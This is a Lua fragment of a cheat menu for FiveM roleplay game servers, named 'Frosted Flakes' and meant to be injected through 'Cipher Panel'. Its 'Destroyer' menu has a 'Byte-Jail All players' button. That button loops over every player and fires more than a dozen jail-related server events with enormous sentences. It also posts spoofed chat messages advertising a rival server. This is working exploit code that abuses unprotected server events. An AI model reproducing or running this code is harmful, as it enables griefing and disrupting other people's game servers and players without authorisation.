TriggerClientEvent("helpCode", 1, [[local mhaonn = true
...
av('~o~¦~w~Frosted Flakes successfully loaded, inject with Cipher Panel.', true)
        ...
        while bw do
            ...
            elseif FrostedMenu.IsMenuOpened('Destroyer') then
                ...
                elseif FrostedMenu.Button('~h~~p~Byte-Jail~s~ All players') then
                    ...
                    TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937, "SekcjaRP.PL LEPSZY SEWRER", 9999999999)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "SekcjaRP.PL LEPSZY SEWRER", 9999999999)
                    ...
                    TriggerServerEvent("esx_jailer:sendToJial", GetPlayerServerId(i), 59999, "SekcjaRP.PL LEPSZY SEWRER", 9333397)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 59999, "SekcjaRP.PL LEPSZY SEWRER", 9333397)
                    TriggerServerEvent("esx-jail:jailPlayer", GetPlayerServerId(i), 9937, "SekcjaRP.PL LEPSZY SEWRER", 9999999999)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "SekcjaRP.PL LEPSZY SEWRER", 9999999999)
                    TriggerServerEvent("hazerp:wyslijdopaki", GetPlayerServerId(i), 5000, "SekcjaRP.PL LEPSZY SEWRER")
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "SekcjaRP.PL LEPSZY SEWRER")
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
                    TriggerServerEvent("8321hiue89js", GetPlayerServerId(i), 5007, "SekcjaRP.PL LEPSZY SEWRER", 323434532532, securityToken)
                    TriggerServerEvent("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(i), 300000, "SekcjaRP.PL LEPSZY SEWRER", 500324532)
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "SekcjaRP.PL LEPSZY SEWRER")
                    TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 999999999 * 60, "SekcjaRP.PL LEPSZY SEWRER")
                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "SekcjaRP.PL LEPSZY SEWRER")
                    TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." SekcjaRP.PL LEPSZY SEWRER")
                    end
